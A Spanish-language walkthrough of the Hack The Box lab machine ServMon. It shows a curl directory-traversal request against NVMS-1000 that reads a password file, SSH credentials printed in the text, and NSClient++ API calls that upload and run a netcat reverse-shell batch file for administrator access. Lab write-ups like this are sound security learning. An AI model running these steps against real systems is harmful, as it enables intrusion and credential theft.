HTB - ServMon
========================

![servmonHTB](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/servmonHTB.png)

Esta maquina fue muy interesante, un metodo de explotación que a mi parecer me dejo loco (por como se hace y por el tiempo que me demore en entenderlo). Además de ser mi primer maquina Windows

## Background
Mediante el servicio FTP encontraremos archivos interesantes, que nos darán algunos usuarios (o posibles rabbit holes :P)
Explotaremos un Directory Traversal dentro de un servicio llamado NVMS 1000, con esto encontraremos un archivo con contraseñas, para posteriormente conseguir acceso al usuario Nadine. 

Despues a traves del servicio NSClient++ y del aplicativo nsclient++.ini encontraremos una contraseña, posiblemente del administrador. Y finalmente obtendremos una shell como admin usando la API del servicio. 

----------------

- Enumeration
- Exploitation
- Privilege escalation 

## Enumeration

Demosle al escaneo de servicios con los que cuenta el host.

`nmap -v -p- --open --min-rate=5000 -Pn -oG initScan 10.10.10.184`

| Parametro | Descripción   |
| ----------|:------------- |
| -v        | Para que nos muestre en la shell lo que va descubriendo |
| -p-       | Escanea todos los puertos                               |
| --open    | Muestra solo los puertos abiertos                       |
| -min-rate | Le decimos que no haga peticiones menores a 5000, sin esto, el escaneo va lento |
| -Pn       | Evitamos que haga resolucion DNS por cada peticion y ademas que haga host discovery (ping) |
| -oG       | Guarda el output en un archivo tipo grep, ya veremos por que |

![initScan](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/initScan.jpg)

Usaremos una función de [S4vitar](https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q) mediante el cual extraeremos los puertos y con la herramienta xclip a nuestra clipboard, evitando tener que copiar todos los puertos uno a uno.

extractPorts
![extractPorts](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/extractPorts.PNG)

![outExtractPorts](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/outExtractPorts.png)

`nmap -sV -sC -p21,22,80,135,139,445,5666,6063,6699,8443,49667,49669,49670 10.10.10.184 -oN portScan`

| Param  | Description   |
| -------|:------------- |
| -sV    | Nos permite ver las versiones de los servicios     |
| -sC    | Muestra todos los scripts relacionados al servicio |
| -oN    | Guarda el output en un archivo Nmap                |

![portScan1](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/portScan1.png)
![portScan2](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/portScan2.png)

Entre todos, tenemos destacables estos servicios: 

- 21: FTP, ademas con el acceso anonymous habilitado
- 22: SSH, quizas para entrar con algun usuario
- 80: HTTP, Una pagina web
- 445: Sambaaaaaa

Empezaremos con el servicio FTP

![ftpAccess](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/ftpAccess.png)

![ftpDir](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/ftpDir.png)

Tenemos dos archivos y dos usuarios

* Nathan
* Nadine

En la interfaz de FTP podemos usar `get nombredelarchivo` para descargarlo a nuestra ubicacion actual.

![ftpFiles](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/ftpFiles.png)

Curioso, Nadine le indica a Nathan que ella dejo el archivo Password.txt en su Escritorio

Por otro lado tenemos unos pasos a realizar, pero no tiene relevancia aún. De acá no tenemos nada mas, asi que veamos el servidor web

![webInterface](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/webInterface.png)

Podemos inspeccionar, probar credenciales por default en los input, SQLi, pero no encontramos nada. Vemos algo llamado NVMS-1000, busquemos que es y si podemos encontrar algún exploit.
>**NVMS-1000** según la busqueda, es un software para el control y gestión de camaras.

## Exploitation 

![nvmsPOCtxt](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/nvmsPOCtxt.png)

Encontramos un `txt`, relacionando un Directory Traversal (lo que permite a cualquier usuario ver archivos del sistema que normalmente no deberia ver)

Podemos relacionar lo encontrado anteriormente con FTP, ya que sabiendo que `Windows` tiene normalmente en su raiz una carpeta llamada `Users` y tenemos dos usuarios, pero realmente uno es el que nos interesa, `Nathan` y que tiene en su escritorio un archivo `Password.txt`, entonces se plantearia algo asi.

Usaré cURL:

`curl --path-as-is -v http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt`

| Parametro      | Descripción   |
| ---------------|:------------- |
| -path-as-is    | Toma la peticion con los "/..", sin esto hace el request a http://10.10.10.184/Users/Nathan/Desktop/Passwords.txt y pues este path no funciona |
| -v             | Para ver que esta pasando por detras del request |

![passwordsCurl](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/passwordsCurl.png)

Perfecto, tenemos credenciales, veamos si alguna es de algún usuario. 
**nOTE**: Podriamos usar un script o Hydra, pero pues fue fácil dar con `Nadine` y su pw

> ssh nadine@10.10.10.184
> password: L1k3B1gBut7s@W0rk

![sshNadine](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/sshNadine.png)

Listos, tenemos la flag del usuario. Veamos los ultimos 18 caracteres

![last18charsUsr](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/last18charsUsr.png)

## Privilege escalation 

##### Tiempo despues...

En base al escaneo de puertos, recordamos que habia un servicio llamado NSClient++ corriendo sobre el puerto 8443, ¿De que trata y que podemos encontrar de el en Windows? 

Acá empieza la locura, despues de momentos sin entender nada, buscando algun exploit para NSClient++, se encontro uno en el que indica que debemos crear un archivo `.bat` el cual hara una conexion a netcat, con lo que necesitamos subir ese `.bat`, ponernos en escucha y ejecutarlo para tener una reverse shell. Interesante, pero como subimos el archivo... En la documentacion de NSClient++ hay una API en la cual, podemos subir scripts, ejecutar scripts, borrar, etc.. (Tambien se puede hacer con el entorno grafico, pero cuando hice la maquina iba muy lento).

> [Documentación de la API](https://docs.nsclient.org/api/rest/)

Acá los pasos del exploit o POC encontrado.
![nsclientExploit](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/nsclientExploit.png)

> [Exploit de nsclient++](https://www.exploit-db.com/exploits/46802)

En la siguiente ruta encontramos la data del NSClient++

![passwordAdmin](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/passwordAdmin.png)

Buscando por internet (y en el exploit nos lo dice), sabemos que el archivo nsclient++.ini tiene la password en este caso del Administrador pero en cuanto al servicio NSClient++.

Pero resumidamente realizaremos estos pasos, ya que los pasos finales no son necesarios (reiniciar la maquina NO era necesario):
1. Subir *nc.exe* (netcat) y el archivo *.bat* a Windows
2. Subir el *.bat* al NSCLient++ como script con la API
3. Ponernos en escucha mediante nc (netcat), esperando la conexion del script
4. Ejecutar el script con la ayuda la API
5. Conseguir la SHELL como Administrator

#### 1. Subir *nc.exe* (netcat) y el archivo *.bat* a Windows

Descargar el ejecutable de netcat desde la web y crear el *.bat*

![creatinganduploadBAT](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/creatinganduploadBAT.png)

Usando `scp` podemos transferir mediante **ssh** archivos, siempre y cuando tengamos credenciales del objetivo.

#### 2. Subir el *.bat* al NSCLient++ como script con la API

Buscar muy bien en la documentacion, entender y hacer, llevo su tiempo, pero fue bonito.

`curl -k -i -u admin https://localhost:8443/api/v1/scripts/ext?all=true`

Primero vemos los scripts actuales que maneja la app. (Ademas tambien para probar que todo va bien :P) 

(Nos va a pedir la pw que ya encontramos en el nsclient++.ini)

![seeScriptsAPI](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/seeScriptsAPI.png)

Listo, ahora lo que haremos sera agregar el *queesesto.bat* como un script

`curl -i -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts\c:\Temp\lana.bat --data-binary @lana.bat`

![addScriptAPI](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/addScriptAPI.png)

Acá usamos PUT para "Poner", indicandole donde esta el archivo y donde queremos subirlo, en este caso en `/scripts`

Ahora, ¿como hacemos para ejecutarlo? Buscando y buscando, en la documentacion hace referencia a `/queries`, en los cuales dentro de cada uno hay unos atributos y comandos, uno de ellos tiene una instrucción de "ejecución". Veamos que *queries* hay.

`curl -k -i -u admin https://localhost:8443/api/v1/queries/`

![queriesGeneralAPI](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/queriesGeneralAPI.png)

Al final vemos que se creo un tipo "JSON" con informacion relacionada a nuestro script.

![queryScriptAPI](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/queryScriptAPI.png)

Ya se ve el comando `execute` y hace referencia a el script agregado.
`"execute_url":"https://localhost:8443/api/v1/queries/queesesto/commands/execute"`

#### 3. Ponernos en escucha mediante nc (netcat), esperando la conexion del script
#### 4. Ejecutar el script con la ayuda la API

Finalmente, por el puerto 443, que fue el que definimos en el *.bat* obtendremos la shell.

`curl -k -i -u admin https://localhost:8443/api/v1/queries/queesesto/commands/execute`

![ncOKAdmin](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/ncOKAdmin.png)

#### 5. Conseguir la SHELL como Administrator

Y... Somos Administrator :)))))

(Debo decir que amé esta forma de intrusión)

![last11charsAdmin](https://github.com/jntxJ/Writeups/blob/master/HTB/ServMon/images/last11charsAdmin.png)

Buena maquina, en su momento estaba muy lenta y ademas las personas por seguir el exploit de internet al pie de la letra pues reseteaban la maquina, lo cual hacia peor el proceso. 

Pero bueno, encantado y muchas gracias por leer.
